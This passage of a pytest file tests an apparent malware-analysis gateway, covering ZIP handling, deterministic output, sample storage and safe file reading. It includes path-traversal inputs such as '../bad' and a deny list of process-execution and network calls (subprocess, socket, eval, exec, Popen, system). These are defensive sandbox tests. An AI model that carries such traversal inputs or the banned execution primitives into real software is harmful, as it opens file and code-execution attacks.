    assert not (gw._jobs / "evil.txt").exists() and not (gw._jobs.parent / "evil.txt").exists()


def test_zip_tools_on_non_zip(gw):
    r = run(gw, b"just text", "zip_list")
    assert not r.ok and "not a readable ZIP" in r.error
    r = gw.call(JOB, "zip_read_text", {"member": "a"})
    assert not r.ok


def test_zip_list_entry_limit(gw):
    z = make_zip({f"f{i:04d}.txt": b"x" for i in range(620)})
    r = run(gw, z, "zip_list")
    assert r.ok and r.truncated and "limited to 500 of 620" in r.text


# ------------------------------------------------------------------ determinism
def test_determinism(gw):
    put(gw, build_pe())
    calls = [("sample_info", {}), ("hash_file", {}), ("identify_type", {}), ("entropy_map", {}),
             ("strings_extract", {"min_len": 4}), ("hexdump", {"offset": 0, "length": 128}),
             ("pe_headers", {}), ("script_detect", {}), ("read_lines", {}), ("grep", {"pattern": "x"}),
             ("decode_layer", {"method": "auto"}), ("zip_list", {})]
    for name, args in calls:
        a = gw.call(JOB, name, args)
        b = gw.call(JOB, name, args)
        assert a.model_dump() == b.model_dump(), name
    # a second gateway instance over the same data directory gives the same results
    gw2 = DevGateway(gw._data_dir)
    for name, args in calls[:8]:
        assert gw.call(JOB, name, args).model_dump() == gw2.call(JOB, name, args).model_dump(), name


# ------------------------------------------------------------------ store_sample / viewer helpers
def test_store_sample_and_viewer_helpers(gw):
    data = b"line one\nline two\nline three\n"
    meta = gw.store_sample("viewer", data)
    assert meta == {"name": "sample", "size": len(data), "md5": hashlib.md5(data).hexdigest(),
                    "sha1": hashlib.sha1(data).hexdigest(), "sha256": hashlib.sha256(data).hexdigest()}
    sample = Path(gw.sample_path("viewer"))
    assert sample.read_bytes() == data
    assert (gw._jobs / "viewer" / "derived").is_dir()
    with pytest.raises(ToolError):
        gw.store_sample("viewer", b"again")           # no overwrite
    with pytest.raises(ToolError):
        gw.store_sample("../bad", b"x")
    files = gw.list_files("viewer")
    assert files == [{"path": "sample", "kind": "sample", "size": len(data), "sha256": meta["sha256"]}]
    res = gw.read_file_lines("viewer", "sample", 2, 3)
    assert res["lines"] == ["line two", "line three"] and res["total_lines"] == 3
    assert res["start"] == 2 and res["end"] == 3
    big = "\n".join(str(i) for i in range(1000)).encode()
    gw.store_sample("viewer2", big)
    assert len(gw.read_file_lines("viewer2", "sample", 1, 5000)["lines"]) == 400
    with pytest.raises(ToolError):
        gw.read_file_lines("viewer2", "../sample", 1, 2)
    with pytest.raises(ToolError):
        gw.read_file_lines("viewer2", "sample", 5000, 5001)
    with pytest.raises(ToolError):
        gw.list_files("nosuchjob")


def test_tool_error_is_never_raised_for_odd_input(gw):
    put(gw, b"abc")
    odd_args = [None, [], {"path": None}, {"path": 5}, {"path": ["sample"]}, {"max_results": 10 ** 30}]
    for tool in [t.name for t in gw.list_tools()]:
        for args in odd_args:
            r = gw.call(JOB, tool, args)  # type: ignore[arg-type]
            assert r.tool_version == "dev-1"
    r = gw.call(JOB, None, {})  # type: ignore[arg-type]
    assert not r.ok


# ------------------------------------------------------------------ no process execution
def test_source_never_executes_code():
    base = Path(dg_module.__file__).parent
    files = [Path(dg_module.__file__)] + sorted((base / "dev_tools").glob("*.py"))
    forbidden_imports = {"subprocess", "multiprocessing", "ctypes", "socket", "pty", "runpy", "importlib",
                         "pickle", "marshal", "code", "urllib.request", "http", "asyncio"}
    forbidden_calls = {"eval", "exec", "compile", "__import__", "system", "popen", "startfile",
                       "execv", "execl", "execvp", "spawnl", "spawnv", "fork", "Popen"}
    for f in files:
        tree = ast.parse(f.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for a in node.names:
                    assert a.name not in forbidden_imports, (f.name, a.name)
            elif isinstance(node, ast.ImportFrom):
                assert (node.module or "") not in forbidden_imports, (f.name, node.module)
            elif isinstance(node, ast.Call):
                fn = node.func
                name = fn.id if isinstance(fn, ast.Name) else fn.attr if isinstance(fn, ast.Attribute) else ""
                if name == "compile" and isinstance(fn, ast.Attribute):
                    continue  # re.compile
                assert name not in forbidden_calls, (f.name, name, node.lineno)
